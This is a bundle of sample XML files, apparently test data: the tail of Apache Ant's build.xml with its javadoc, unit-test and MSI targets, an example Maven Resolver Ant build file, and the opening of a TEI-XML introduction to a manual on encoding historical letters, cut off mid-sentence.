    <fail message="You must set the property ant.install=/where/to/install" unless="ant.install"/>
    <antcall inheritAll="false" target="dist-lite">
      <param name="dist.dir" value="${ant.install}"/>
    </antcall>
  </target>

  <!--
       ===================================================================
         Creates the API documentation
       ===================================================================
  -->
  <target name="check-javadoc" depends="prepare">
    <uptodate property="javadoc.notrequired"
              targetfile="${build.javadocs}/packages.html">
      <srcfiles dir="${java.dir}" includes="**/*.java"/>
    </uptodate>
    <uptodate property="tests.javadoc.notrequired"
              targetfile="${build.tests.javadocs}/packages.html">
      <srcfiles dir="${src.junit}">
        <patternset refid="useful.tests"/>
      </srcfiles>
    </uptodate>
  </target>

  <target name="javadocs" depends="check-javadoc"
          description="--> creates the API documentation" unless="javadoc.notrequired">
    <mkdir dir="${build.javadocs}"/>
    <javadoc useexternalfile="yes"
             destdir="${build.javadocs}"
             failonerror="true"
             author="true"
             version="true"
             locale="en"
             windowtitle="${Name} API"
             doctitle="${Name}"
             maxmemory="1000M"
             verbose="${javadoc.verbose}"
             additionalparam="${javadoc.doclint.none}">

      <packageset dir="${java.dir}"/>

      <!-- hide some meta information for javadoc -->
      <tag name="todo" description="To do:" scope="all"/>
      <tag name="ant.task" enabled="false" description="Task:" scope="types"/>
      <tag name="ant.datatype" enabled="false" description="Data type:" scope="types"/>
      <tag name="ant.attribute" enabled="false" description="Attribute:" scope="types"/>
      <tag name="ant.attribute.group" enabled="false" description="Attribute group:" scope="types"/>
      <tag name="ant.element" enabled="false" description="Nested element:" scope="types"/>
      <group title="Apache Ant Core" packages="org.apache.tools.ant*"/>
      <group title="Core Tasks" packages="org.apache.tools.ant.taskdefs*"/>
      <group title="Core Types" packages="org.apache.tools.ant.types*"/>
      <group title="Optional Tasks" packages="org.apache.tools.ant.taskdefs.optional*"/>
      <group title="Optional Types" packages="org.apache.tools.ant.types.optional*"/>
      <group title="Ant Utilities" packages="org.apache.tools.ant.util*"/>
      <classpath refid="tests-classpath"/>
    </javadoc>
  </target>

  <target name="test-javadocs" depends="check-javadoc" unless="tests.javadoc.notrequired"
          description="--> creates the API documentation for test utilities">
    <mkdir dir="${build.tests.javadocs}"/>
    <javadoc useexternalfile="yes"
             destdir="${build.tests.javadocs}"
             failonerror="true"
             author="true"
             version="true"
             locale="en"
             windowtitle="${Name} Test Utilities"
             doctitle="${Name}"
             additionalparam="${javadoc.doclint.none}">

      <!-- hide some meta information for javadoc -->
      <tag name="pre" description="Precondition:" scope="all"/>

      <fileset dir="${src.junit}">
        <patternset refid="useful.tests"/>
      </fileset>
      <classpath refid="tests-classpath"/>
    </javadoc>
  </target>

  <!--
       ===================================================================
         Compile testcases
       ===================================================================
  -->
  <target name="compile-tests" depends="build" if="junit.present">
    <mkdir dir="${build.tests}"/>

    <javac srcdir="${src.junit}"
           includeantruntime="false"
           destdir="${build.tests}"
           debug="${debug}"
           target="${javac.target}"
           source="${javac.source}"
           release="${javac.release}"
           deprecation="${deprecation}">
      <compilerarg line="-proc:none"/>
      <classpath refid="tests-classpath"/>

      <selector refid="conditional-patterns"/>
    </javac>

    <!-- Used by AntlibTest.testAntlibResource: -->
    <jar jarfile="${build.tests}/org/apache/tools/ant/taskdefs/test2-antlib.jar">
      <manifest>
        <attribute name="Extension-name"
                   value="org.apache.tools.ant"/>
        <attribute name="Specification-Title"
                   value="Apache Ant"/>
        <attribute name="Specification-Version"
                   value="${manifest-version}"/>
        <attribute name="Specification-Vendor"
                   value="Apache Software Foundation"/>
        <attribute name="Implementation-Title"
                   value="org.apache.tools.ant"/>
        <attribute name="Implementation-Version"
                   value="${manifest-version}"/>
        <attribute name="Implementation-Vendor"
                   value="Apache Software Foundation"/>
      </manifest>
      <zipfileset dir="${tests.etc.dir}" fullpath="taskdefs/test.antlib.xml">
        <include name="taskdefs/test2.antlib.xml"/>
      </zipfileset>
    </jar>
  </target>

  <target name="dump-info" depends="dump-sys-properties,run-which"/>

  <target name="dump-sys-properties" depends="xml-check" unless="which.present">
    <echo message="java.vm.info=${java.vm.info}"/>
    <echo message="java.vm.name=${java.vm.name}"/>
    <echo message="java.vm.vendor=${java.vm.vendor}"/>
    <echo message="java.vm.version=${java.vm.version}"/>
    <echo message="os.arch=${os.arch}"/>
    <echo message="os.name=${os.name}"/>
    <echo message="os.version=${os.version}"/>
    <echo message="file.encoding=${file.encoding}"/>
    <echo message="user.language=${user.language}"/>
    <echo message="ant.version=${ant.version}"/>
  </target>

  <!-- helper class from Xalan2 to check for jar versioning of xml/xsl processors -->
  <target name="xml-check" depends="check-optional-packages" if="xalan.envcheck" unless="which.present">
    <java classname="org.apache.xalan.xslt.EnvironmentCheck"/>
  </target>

  <target name="run-which" depends="check-optional-packages" if="which.present">
    <java classname="org.apache.env.Which" taskname="which" classpathref="classpath"/>
  </target>

  <!-- test to see if we are online or not. can take a while when we are off line, so
       setting the property is a good shortcut-->
  <target name="probe-offline">
    <condition property="offline">
      <or>
        <isset property="offline"/>
        <not>
          <http url="http://www.apache.org/"/>
        </not>
      </or>
    </condition>
    <echo level="verbose"> offline=${offline}</echo>
  </target>

  <!--
       ===================================================================
         Run testcase
       ===================================================================
  -->

  <target name="check-failed">
    <condition property="tests.failed">
      <or>
        <isset property="junit.failed"/>
        <isset property="antunit.failed"/>
      </or>
    </condition>
  </target>

  <target name="test" depends="junit-report,antunit-report,check-failed"
          description="--> run unit tests and reports">
    <fail if="tests.failed" unless="ignore.tests.failed">Unit tests failed; see:
${build.junit.reports}
${antunit.reports}
    </fail>
  </target>

  <target name="run-tests" depends="junit-tests,antunit-tests,check-failed"
          description="--> run unit tests without reports">
    <fail if="tests.failed" message="Unit tests failed"/>
  </target>

  <target name="test-init" depends="probe-offline,check-optional-packages,dump-info">
    <mkdir dir="${build.junit.tmpdir}"/>
    <condition property="sun.io.useCanonCaches" value="false">
      <not>
        <javaversion atleast="9"/>
      </not>
    </condition>
    <macrodef name="test-junit">
      <element name="junit-nested" implicit="true"/>
      <sequential>
        <!-- Delete 'old' collector classes -->
        <delete failonerror="false">
          <fileset dir="${junit.collector.dir}" includes="${junit.collector.class}*.class"/>
        </delete>
        <!-- compile the FailedTests class if present -->
        <mkdir dir="${junit.collector.dir}"/>
        <!-- FIXME: removed junit collector build code
        <javac srcdir="${junit.collector.dir}" destdir="${junit.collector.dir}">
          <classpath id="failure.cp">
            <pathelement location="${build.classes}"/>
            <pathelement location="${build.tests}"/>
          </classpath>
        </javac>
        -->
        <available file="${junit.collector.dir}/${junit.collector.class}.class"
                   property="hasFailingTests"/>
        <!-- run the tests -->
        <mkdir dir="${build.junit.xml}"/>
        <property name="test.junit.vmargs" value=""/>
        <property name="ant.junit.failureCollector"
                  value="${junit.collector.dir}/${junit.collector.class}"/>
        <!-- TODO includeantruntime="false" does not solve "multiple versions of ant detected in path for junit" warning -->
        <junit printsummary="${junit.summary}"
               haltonfailure="${test.haltonfailure}"
               fork="${junit.fork}"
               forkmode="${junit.forkmode}"
               threads="${junit.threads}"
               tempdir="${build.dir}"
               failureproperty="junit.failed"
               errorproperty="junit.failed"
               filtertrace="${junit.filtertrace}">
          <sysproperty key="ant.home" value="${ant.home}"/>
          <sysproperty key="build.classes.value" value="${build.classes.value}"/>
          <sysproperty key="build.tests.value" value="${build.tests.value}"/>
          <sysproperty key="offline" value="${offline}"/>
          <sysproperty key="tests-classpath.value"
                       value="${toString:tests-runtime-classpath}"/>
          <sysproperty key="root" file="${basedir}"/>
          <sysproperty key="build.compiler" value="${build.compiler}"/>
          <sysproperty key="tests.and.ant.share.classloader"
                       value="${tests.and.ant.share.classloader}"/>
          <sysproperty key="java.io.tmpdir" file="${build.junit.tmpdir}"/>
          <!-- in Java8 the canonical cache seems to interfere with
               our symlink tests -->
          <syspropertyset>
            <propertyref name="sun.io.useCanonCaches"/>
          </syspropertyset>
          <classpath>
            <path refid="tests-runtime-classpath"/>
            <pathelement location="${junit.collector.dir}"/>
            <!-- FIXME: remove failure collector build code for the moment
                 <path refid="failure.cp"/>
            -->
          </classpath>
          <!-- FIXME: remove failure collector build code for the moment
               <formatter type="failure" usefile="false"/>
          -->
          <formatter type="xml"/>
          <jvmarg line="${test.junit.vmargs}"/>
          <!-- FIXME: remove failure collector build code for the moment
               <test name="${junit.collector.class}" if="hasFailingTests"/>
          -->
          <junit-nested/>
        </junit>
      </sequential>
    </macrodef>

    <fail>"testcase" cannot be specified with "junit.testcase" or "antunit.testcase".
      <condition>
        <and>
          <isset property="testcase"/>
          <or>
            <isset property="antunit.testcase"/>
            <isset property="junit.testcase"/>
          </or>
        </and>
      </condition>
    </fail>

    <condition property="antunit.testcase" value="${testcase}">
      <available file="${src.antunit}/${testcase}"/>
    </condition>

    <condition property="junit.testcase" value="${testcase}">
      <available classname="${testcase}" classpathref="tests-runtime-classpath" ignoresystemclasses="${ignoresystemclasses}"/>
    </condition>

    <fail>Cannot locate test ${testcase}
      <condition>
        <and>
          <isset property="testcase"/>
          <not>
            <or>
              <isset property="antunit.testcase"/>
              <isset property="junit.testcase"/>
            </or>
          </not>
        </and>
      </condition>
    </fail>

    <condition property="run.junit">
      <and>
        <not><equals arg1="${testcase}" arg2="${antunit.testcase}"/></not>
        <isset property="junit.present"/>
        <available file="${src.junit}"/>
      </and>
    </condition>

    <condition property="junit.single">
      <and>
        <isset property="junit.testcase"/>
        <isset property="run.junit"/>
      </and>
    </condition>

    <condition property="junit.batch">
      <and>
        <not><isset property="junit.testcase"/></not>
        <isset property="run.junit"/>
      </and>
    </condition>

    <condition property="run.antunit">
      <and>
        <not><equals arg1="${testcase}" arg2="${junit.testcase}"/></not>
        <isset property="antunit.present"/>
        <available file="${src.antunit}"/>
      </and>
    </condition>

    <condition property="run.antunit.report">
      <isset property="run.antunit"/>
    </condition>

    <condition property="run.junit.report">
      <isset property="run.junit"/>
    </condition>
  </target>

  <target name="junit-report" depends="junit-tests,junit-report-only"/>

  <target name="junit-report-only" depends="test-init" if="${run.junit.report}">
    <mkdir dir="${build.junit.reports}"/>
    <junitreport todir="${build.junit.reports}">
      <fileset dir="${build.junit.xml}">
        <include name="TEST-*.xml"/>
      </fileset>
      <report format="frames" todir="${build.junit.reports}"/>
    </junitreport>
  </target>

  <target name="junit-tests" depends="junit-batch,graaljs-tests,junit-single-test"/>

  <target name="graaljs-tests" depends="compile-tests,test-init"
          if="graaljs.present">
    <junit printsummary="${junit.summary}"
           haltonfailure="${test.haltonfailure}"
           fork="true"
           forkmode="perTest"
           tempdir="${build.dir}"
           failureproperty="junit.failed"
           errorproperty="junit.failed"
           filtertrace="${junit.filtertrace}">
      <sysproperty key="ant.home" value="${ant.home}"/>
      <sysproperty key="build.classes.value" value="${build.classes.value}"/>
      <sysproperty key="build.tests.value" value="${build.tests.value}"/>
      <sysproperty key="offline" value="${offline}"/>
      <sysproperty key="tests-classpath.value"
                   value="${toString:tests-runtime-classpath}"/>
      <sysproperty key="root" file="${basedir}"/>
      <sysproperty key="build.compiler" value="${build.compiler}"/>
      <sysproperty key="tests.and.ant.share.classloader"
                   value="${tests.and.ant.share.classloader}"/>
      <sysproperty key="java.io.tmpdir" file="${build.junit.tmpdir}"/>
      <classpath>
        <path refid="tests-runtime-classpath"/>
        <pathelement location="${junit.collector.dir}"/>
      </classpath>
      <formatter type="xml"/>
      <batchtest todir="${build.junit.xml}" unless="hasFailingTests">
        <fileset dir="${src.junit}" excludes="**/Abstract*">
          <selector refid="needs.graaljs" if="graaljs.present"/>
        </fileset>
      </batchtest>
    </junit>
  </target>

  <target name="junit-batch" depends="compile-tests,test-init" if="junit.batch">

    <property name="junit.includes" value="**/*Test*"/>
    <property name="junit.excludes" value=""/>

    <test-junit>
      <formatter type="brief" usefile="false"/>

      <batchtest todir="${build.junit.xml}" unless="hasFailingTests">
        <fileset dir="${src.junit}"
                 includes="${junit.includes}" excludes="${junit.excludes}">

          <!-- abstract classes, not testcases -->
          <exclude name="${taskdefs.package}/TaskdefsTest.java"/>
          <exclude name="${ant.package}/BuildFileTest.java"/>
          <exclude name="${ant.package}/MagicTestNames.java"/>
          <exclude name="${regexp.package}/RegexpMatcherTest.java"/>
          <exclude name="${regexp.package}/RegexpTest.java"/>
          <exclude name="${optional.package}/AbstractXSLTLiaisonTest.java"/>
          <exclude name="${ant.package}/types/AbstractFileSetTest.java"/>
          <exclude name="${ant.package}/types/selectors/BaseSelectorTest.java"/>

          <!-- helper classes, not testcases -->
          <exclude name="org/example/"/>
          <exclude name="${taskdefs.package}/TaskdefTest*Task.java"/>
          <exclude name="${optional.package}/junit/TestFormatter.java"/>
          <exclude name="${ant.package}/TestHelper.java"/>

          <!-- JUnit 5 / junitlauncher tests that aren't meant to run by junit task -->
          <exclude name="${optional.package}/junitlauncher/"/>

          <!-- interactive tests -->
          <exclude name="${taskdefs.package}/TestProcess.java"/>
          <exclude name="${optional.package}/splash/SplashScreenTest.java"/>

          <!-- GraalVM JavaScript Nashorn compat tests influencing current JVM -->
          <exclude name="${optional.package}/script/graal/"/>

          <!-- only run these tests if their required libraries are installed -->
          <selector refid="conditional-patterns"/>

          <!-- tests excluded if the test is run in offline mode -->
          <patternset refid="onlinetests"/>

          <!-- failing tests excluded unless run.failing.tests is set -->
          <patternset refid="teststhatfail"/>

          <!-- needs BSF to work -->
          <exclude name="${optional.package}/Rhino*.java"
                   unless="bsf.present"/>
          <exclude name="${optional.package}/Rhino*.java"
                   unless="rhino.present"/>
          <exclude name="${optional.package}/script/*.java"
                   unless="bsf.present"/>
          <exclude name="${optional.package}/script/*.java"
                   unless="rhino.present"/>
          <exclude name="${optional.package}/BeanShellScriptTest.java"
                   unless="bsf.present"/>
          <exclude name="${optional.package}/BeanShellScriptTest.java"
                   unless="beanshell.present"/>
          <exclude name="${optional.type.package}/Script*.java"
                   unless="bsf.present"/>
          <exclude name="${optional.type.package}/Script*.java"
                   unless="rhino.present"/>

          <!-- fail if testcases can be loaded from the system classloader -->
          <exclude name="${ant.package}/AntClassLoaderDelegationTest.java"
                   if="tests.are.on.system.classpath"/>
          <exclude name="${optional.package}/junit/JUnitClassLoaderTest.java"
                   if="tests.are.on.system.classpath"/>

          <!-- these tests need to be localised before being ran???? -->
          <exclude name="${optional.package}/PvcsTest.java"/>

          <exclude name="${optional.package}/junit/JUnitReportTest.java"
                   unless="run.junitreport"/>

          <!-- needs xerces to work -->
          <exclude name="${ant.package}/IncludeTest.java"
                   unless="xerces1.present"/>
          <exclude name="${type.package}/selectors/ModifiedSelectorTest.java"
                   unless="xerces1.present"/>

          <!-- needs resolver.jar to work -->
          <exclude name="${optional.package}/XmlValidateCatalogTest.java"
                   unless="apache.resolver.present"/>

          <!-- needs jasperc -->
          <exclude name="${optional.package}/JspcTest.java"
                   unless="jasper.present"/>

          <!-- needs JavaMail -->
          <exclude name="${taskdefs.package}/email/EmailTaskTest.java"
                   unless="javamail.complete"/>

          <!--  These tests only passes if testcases and Ant classes have
               been loaded by the same classloader - will throw
               IllegalAccessExceptions otherwise.  -->
          <exclude name="${taskdefs.package}/SQLExecTest.java"
                   unless="tests.and.ant.share.classloader"/>
          <exclude name="${taskdefs.package}/cvslib/ChangeLogWriterTest.java"
                   unless="tests.and.ant.share.classloader"/>
          <exclude name="${taskdefs.package}/cvslib/ChangeLogParserTest.java"
                   unless="tests.and.ant.share.classloader"/>
          <exclude name="${optional.package}/sos/SOSTest.java"
                   unless="tests.and.ant.share.classloader"/>
          <exclude name="${optional.package}/vss/MSVSSTest.java"
                   unless="tests.and.ant.share.classloader"/>
          <exclude name="${optional.package}/TraXLiaisonTest.java"
                   unless="tests.and.ant.share.classloader"/>
          <exclude name="${taskdefs.package}/ProcessDestroyerTest.java"
                   unless="tests.and.ant.share.classloader"/>
          <exclude name="${taskdefs.package}/ProtectedJarMethodsTest.java"
                   unless="tests.and.ant.share.classloader"/>
          <exclude name="${ant.package}/launch/LocatorTest.java"
                   unless="tests.and.ant.share.classloader"/>
          <exclude name="${ant.package}/DefaultLoggerTest.java"
                   unless="tests.and.ant.share.classloader"/>
          <exclude name="${taskdefs.package}/ZipExtraFieldTest.java"
                   unless="tests.and.ant.share.classloader"/>

          <!-- can only run if cvs is installed on your machine
               enable by setting the property have.cvs
          -->
          <exclude name="${taskdefs.package}/AbstractCvsTaskTest.java"
                   unless="have.cvs"/>

          <!-- needs a local ftp server and the entry of a user/password combination -->
          <exclude name="${optional.package}/net/FTPTest.java"/>

          <!-- test needs special setup -->
          <exclude name="${optional.package}/ssh/ScpTest.java"/>

          <!-- test fails if build/classes and ant.jar are using the same
               classloader  -->
          <exclude name="${ant.package}/util/ClasspathUtilsTest.java"
                   if="tests.and.ant.share.classloader"/>
        </fileset>
      </batchtest>
    </test-junit>
  </target>

  <target name="junit-single-test" depends="compile-tests,junit-single-test-only"
          description="--> runs the single unit test at $${junit.testcase}"/>

  <target name="junit-single-test-only" depends="test-init" if="junit.single"
          description="--> runs the single unit test at $${junit.testcase} (no compile)">
    <test-junit>
      <formatter type="plain" usefile="false"/>
      <test name="${junit.testcase}" todir="${build.junit.xml}"/>
    </test-junit>
  </target>

  <target name="interactive-tests" depends="compile-tests"
          description="--> runs interactive tests">
    <java classpathref="tests-runtime-classpath"
          classname="org.apache.tools.ant.taskdefs.TestProcess"
          fork="true"/>
  </target>

  <target name="-antunit-check-location">
    <condition property="antunit.recommended.location">
      <or>
        <equals arg1="${ant.home}" arg2="${bootstrap.dir}"/>
        <equals arg1="${ant.home}" arg2="${dist.dir}"/>
      </or>
    </condition>
  </target>

  <target name="-antunit-warn-location" depends="-antunit-check-location" if="run.antunit" unless="${antunit.recommended.location}">
      <echo>AntUnit tests must be run with ${bootstrap.dir} (or ${dist.dir}), not ${ant.home}. Try './build.sh antunit-tests' for example.</echo>
  </target>

  <target name="-ant-dist-warn-jdk9+" unless="jdk9+">
      <echo>Java 9+ features won't be available in the distribution</echo>
  </target>

  <target name="antunit-tests" depends="build,test-init,-antunit-warn-location" if="run.antunit"
          description="--> run the antunit tests">
    <condition property="antunit.includes" value="${antunit.testcase}"
               else="**/test.xml,**/*-test.xml">
      <isset property="antunit.testcase"/>
    </condition>

    <property name="antunit.excludes" value=""/>

    <mkdir dir="${antunit.xml}"/>
    <au:antunit xmlns:au="antlib:org.apache.ant.antunit"
                failonerror="false" errorproperty="antunit.failed">
      <fileset dir="${src.antunit}" includes="${antunit.includes}"
               excludes="${antunit.excludes}"/>
      <au:plainlistener logLevel="${antunit.loglevel}"/>
      <au:xmllistener todir="${antunit.xml}"/>
      <propertyset>
        <propertyref name="antunit.tmpdir"/>
        <propertyref name="ant.home"/>
        <propertyref name="jenkins"/>
      </propertyset>
    </au:antunit>
  </target>

  <target name="antunit-report" depends="antunit-tests,antunit-report-only"/>

  <target name="antunit-report-only" depends="test-init" if="run.antunit.report">
    <length>
      <fileset dir="${antunit.xml}" includes="TEST-*.xml"/>
    </length>
    <mkdir dir="${antunit.reports}"/>
    <junitreport todir="${antunit.reports}">
      <fileset dir="${antunit.xml}" includes="TEST-*.xml"/>
      <report styledir="${src.antunit}" format="frames"
              todir="${antunit.reports}"/>
    </junitreport>
    <length>
      <fileset dir="${antunit.xml}" includes="TEST-*.xml"/>
    </length>
  </target>

  <!-- JetBrains builds need this target -->
  <target name="printFailingTests" depends="print-failing-tests"/>

  <target name="print-failing-tests">
    <property name="failingtests.dir" value="${build.dir}/errors"/>
    <mkdir dir=""/>
    <xslt style="${etc.dir}/printFailingTests.xsl"
          destdir="${failingtests.dir}" extension=".txt"
          basedir="${build.dir}" includes="testcases/**/TEST-*.xml,antunit/xml/TEST-*.xml"/>
    <echo>+-------------------------------------------------------------------------------------</echo>
    <echo>| FAILING TESTS:</echo>
    <echo>+-------------------------------------------------------------------------------------</echo>
    <concat>
      <!-- generated message files if they arent empty -->
      <fileset dir="${failingtests.dir}">
        <size value="0" when="more"/>
      </fileset>
      <!-- 'skip' empty lines -->
      <filterchain>
        <linecontains>
          <contains value="|"/>
        </linecontains>
      </filterchain>
    </concat>
    <echo>+-------------------------------------------------------------------------------------</echo>
  </target>

  <!--
       ===================================================================
         Main target - runs dist-lite by default
       ===================================================================
  -->
  <target name="main" depends="dist-lite"
          description="--> creates a minimum distribution in ./dist"/>

  <!--
       ===================================================================
         MSI target - creates an MSI installer file with the help of
                      the WiX toolset and the dotnet Antlib.
       ===================================================================
  -->
  <target name="msi" depends="dist-internal" xmlns:dn="antlib:org.apache.ant.dotnet"
          description="--> creates an MSI file for Ant, requires WiX and the dotnet Antlib">

    <property name="msi.dir" value="${build.dir}"/>
    <property name="msi.name" value="${name}-${project.version}.msi"/>
    <property name="msi.file" value="${msi.dir}/${msi.name}"/>
    <property name="wix.home" value="${user.home}/wix"/>
    <property name="wixobj.dir" value="${build.dir}/wix"/>

    <property name="dist.dir.resolved" location="${dist.dir}"/>

    <mkdir dir="${wixobj.dir}"/>

    <dn:wix target="${msi.file}"
            mode="both" wixHome="${wix.home}" wixobjDestDir="${wixobj.dir}">
      <sources dir="${etc.dir}" includes="*.wxs"/>
      <moresources dir="${dist.dir}"/>

      <candleParameter name="dist.dir" value="${dist.dir.resolved}"/>
      <candleParameter name="version" value="${manifest-version}"/>
    </dn:wix>
  </target>

</project>
</file>

<file path="sample_data/test_files/small/ant/maven-resolver-ant-build.xml">
<?xml version="1.0" encoding="UTF-8"?>

<!--
  Licensed to the Apache Software Foundation (ASF) under one
  or more contributor license agreements.  See the NOTICE file
  distributed with this work for additional information
  regarding copyright ownership.  The ASF licenses this file
  to you under the Apache License, Version 2.0 (the
  "License"); you may not use this file except in compliance
  with the License.  You may obtain a copy of the License at

  http://www.apache.org/licenses/LICENSE-2.0

  Unless required by applicable law or agreed to in writing,
  software distributed under the License is distributed on an
  "AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
  KIND, either express or implied.  See the License for the
  specific language governing permissions and limitations
  under the License.
-->

<project xmlns:resolver="antlib:org.apache.maven.resolver.ant" default="deploy">

  <!--
  This is an example Ant build file using the Maven Artifact Resolver Ant Tasks to compile, test, install and deploy the
  maven-resolver-ant-tasks project itself. As a prerequisite, run "mvn package" first to assemble the
  maven-resolver-ant-task.jar which this build file will load below.
  -->

  <taskdef uri="antlib:org.apache.maven.resolver.ant" resource="org/apache/maven/resolver/ant/antlib.xml">
    <classpath>
      <fileset dir="target" includes="maven-resolver-ant-tasks-*uber.jar"/>
    </classpath>
  </taskdef>

  <property name="build.dir" location="target/its"/>

  <resolver:localrepo dir="${build.dir}/local-repo"/>

  <resolver:remoterepo id="rao" url="https://repository.apache.org/content/groups/snapshots" type="default"
                     releases="true" snapshots="true" updates="daily" checksums="fail"/>

  <resolver:remoterepos id="resolver.repositories">
    <resolver:remoterepo refid="central"/>
    <resolver:remoterepo refid="rao"/>
  </resolver:remoterepos>

  <resolver:pom file="pom.xml" id="pom"/>

  <target name="clean">
    <delete dir="${build.dir}"/>
  </target>

  <target name="process-resources">
    <copy todir="${build.dir}/classes">
      <fileset dir="src/main/resources"/>
    </copy>
  </target>

  <target name="compile" depends="process-resources">
    <mkdir dir="${build.dir}/classes"/>

    <resolver:resolve>
      <dependencies>
        <pom refid="pom"/>
      </dependencies>
      <path refid="cp.compile.main" classpath="compile"/>
    </resolver:resolve>

    <javac classpathref="cp.compile.main" srcdir="src/main/java" destdir="${build.dir}/classes"
           includeAntRuntime="false" source="8" target="8" encoding="UTF-8" fork="true"/>
  </target>

  <target name="process-test-resources" depends="compile">
  </target>

  <target name="test-compile" depends="process-test-resources">
    <mkdir dir="${build.dir}/test-classes"/>

    <resolver:resolve>
      <dependencies>
        <pom refid="pom"/>
      </dependencies>
      <path refid="cp.compile.test" classpath="test"/>
      <path refid="cp.runtime.test" scopes="compile,runtime,test"/>
    </resolver:resolve>

    <path id="cp.test">
      <path refid="cp.compile.test"/>
      <pathelement location="${build.dir}/classes"/>
    </path>

    <javac classpathref="cp.test" srcdir="src/test/java" destdir="${build.dir}/test-classes"
           includeAntRuntime="false" source="8" target="8" encoding="UTF-8" fork="true"/>
  </target>

  <target name="test" depends="test-compile">
    <junit haltonfailure="true" fork="true" forkmode="once" outputtoformatters="false">
      <classpath>
        <pathelement location="${build.dir}/test-classes"/>
        <pathelement location="${build.dir}/classes"/>
        <path refid="cp.runtime.test"/>
      </classpath>

      <formatter type="brief" usefile="false"/>

      <batchtest>
        <fileset dir="${build.dir}/test-classes" includes="**/*Test.class" excludes="**/AntBuildsTest*"/>
      </batchtest>
    </junit>
  </target>

  <target name="package" depends="test">
    <jar destfile="${build.dir}/maven-resolver-ant-tasks-${pom.version}.jar" basedir="${build.dir}/classes"/>
    <jar destfile="${build.dir}/maven-resolver-ant-tasks-${pom.version}-sources.jar" basedir="src/main/java"/>

    <resolver:artifacts id="output">
      <artifact file="${build.dir}/maven-resolver-ant-tasks-${pom.version}.jar"/>
      <artifact file="${build.dir}/maven-resolver-ant-tasks-${pom.version}-sources.jar" classifier="sources"/>
    </resolver:artifacts>
  </target>

  <target name="install" depends="package">
    <resolver:install artifactsref="output"/>
  </target>

  <target name="deploy" depends="install">
    <resolver:deploy artifactsref="output">
      <remoteRepo id="dist" url="file:///${build.dir}/dist-repo"/>
    </resolver:deploy>
  </target>

</project>
</file>

<file path="sample_data/test_files/small/dita/tei-correspondence-intro.xml">
<?xml version="1.0" encoding="UTF-8"?>
<TEI xmlns="http://www.tei-c.org/ns/1.0" xml:id="introduction">
	<teiHeader>
		<fileDesc>
			<titleStmt>
				<title>Introduction</title>
				<author key="dumont">Stefan Dumont</author>
				<author key="haaf">Susanne Haaf</author>
				<author key="seifert">Sabine Seifert</author>
			</titleStmt>
			<publicationStmt>
				<publisher>Berlin-Brandenburg Academy of Sciences and Humanities</publisher>
				<date when="2019-12-15"/>
				<idno type="urn">urn:nbn:de:kobv:b4-20200110163942154-1974512-7</idno>
				<idno type="url">https://encoding-correspondence.bbaw.de/v1/introduction.html</idno>
				<idno type="zotero"
					>https://www.zotero.org/groups/2248469/encoding_correspondence/items/itemKey/CGIQCIKJ</idno>
			</publicationStmt>
			<seriesStmt>
				<title type="main">Encoding Correspondence.</title>
				<title type="sub">A Manual for encoding letters and postcards in TEI-XML and
					DTABf</title>
				<editor>Stefan Dumont</editor>
				<editor>Susanne Haaf</editor>
				<editor>Sabine Seifert</editor>
				<idno type="urn">urn:nbn:de:kobv:b4-20200110163329488-8695229-7</idno>
				<idno type="url">https://encoding-correspondence.bbaw.de/v1/</idno>
				<biblScope unit="edition">v1</biblScope>
			</seriesStmt>
			<sourceDesc>
				<p>Born digital.</p>
			</sourceDesc>
		</fileDesc>
		<revisionDesc>
			<listChange>
				<change n="1" when="2019-10-10" status="draft">Initial Version</change>
			</listChange>
		</revisionDesc>
	</teiHeader>
	<text>
		<body>
			<div xml:id="c-1">
				<p n="1">Whether letters, postcards, telegrams, e-mails, sms, or
					chats—correspondence between different agents is and for a very long time has
					been a crucial part of everyday’s life with just as much impact on private as on
					work and public lives. Naturally, already before the permeation of technology in
					our society, written correspondence captured vast amounts of people’s time. And
					today, the direct and simple ways of digital communication are used even more
					extensively.</p>
				<p n="2">As for historical correspondence, we gain insight in this extremely
					productive area by letters passed on to us which were written by scholars,
					politicians, artists, celebrities, or private persons. This way, we do not only
					learn about the impact of correspondence by the sheer amount of documents
					available in archives. These documents are also witnesses of peoples’ broad
					networks and of the topics which concerned them. They deliver insight in private
					views on public affairs as well as in everyday’s problems of historical persons
					of interest.</p>
				<p n="3">Thus, and not surprisingly, historical documents of communication quite
					frequently have become the subject of humanities’ research and are prepared in
					scholarly editions in order to enable and facilitate further research. Since
					nowadays editions are usually digital-born and, most of the time, also remain
					digital, this area has increasingly been attracting the attention of the <ref
						target="https://tei-c.org/">Text Encoding Initiative</ref> community.
					Letters, for instance, may appear quite homogeneously structured at first sight
					but—as transient documents—tend to exhibit various peculiarities and exceptions
					from customary practice. And more generally, the available text types for
					communication changed over time, the text types themselves changed in their
					specific style and structuring as did the contexts in which these text types
					were typically used.</p>
				<p n="4">As conveners of the <ref
						target="https://tei-c.org/Activities/SIG/Correspondence/">TEI Correspondence
						Special Interest Group (SIG)</ref><note n="1" xml:id="fn1">See also <ref
							target="https://wiki.tei-c.org/index.php/SIG:Correspondence">the Wiki
							page of the TEI Correspondence SIG</ref>.</note> and representative for
					the <ref target="http://deutschestextarchiv.de/doku/basisformat/">Deutsches
						Textarchiv (DTA) Base Format</ref> (Haaf/Geyken/Wiegand 2014/15), we were
					repeatedly asked about the TEI encoding of correspondence-specific phenomena. In
					2015, the TEI Correspondence SIG had already addressed some of the problems with
					TEI encoding correspondence by introducing a new correspondence model to the TEI
					Guidelines with <gi>correspDesc</gi> and its several child elements
					(Stadler/Illetschko/Seifert 2016).<note n="2" xml:id="fn2">Also cf. the TEI
						Guidelines, <ref
							target="https://www.tei-c.org/release/doc/tei-p5-doc/en/html/HD.html#HD44CD"
							>chapter 2.4.6: Correspondence Description</ref>.</note> The DTA Base
					Format, which had started off as a format for printed texts, was opened to
					manuscript texts and enriched with markup for manuscript-specific phenomena in
					2016 so that, among other things, it enables the integration of handwritten or
					typed (in addition to printed) letters in the DTA text corpus (Haaf/Thomas
					2017).</p>
				<p n="5">Apart from mere correspondence annotation, there also was and is a growing
					demand to effectively link correspondence editions and projects in order to
					reveal correspondence networks of the ‘Republic of Letters’ and beyond. This
					desideratum led to the creation of the <ref
						target="https://github.com/TEI-Correspondence-SIG/CMIF">Correspondence
						Metadata Interchange Format (CMIF)</ref>—a constrained subset of the full
					TEI standard of the <gi>correspDesc</gi> element—and to the development of the
					web service <ref target="https://correspsearch.net/">correspSearch</ref> (Dumont
					2016) with CMIF as exchange format. In 2018, the Rahtz Prize for TEI Ingenuity
					was granted to the developers of the <gi>correspDesc</gi> encoding model, the
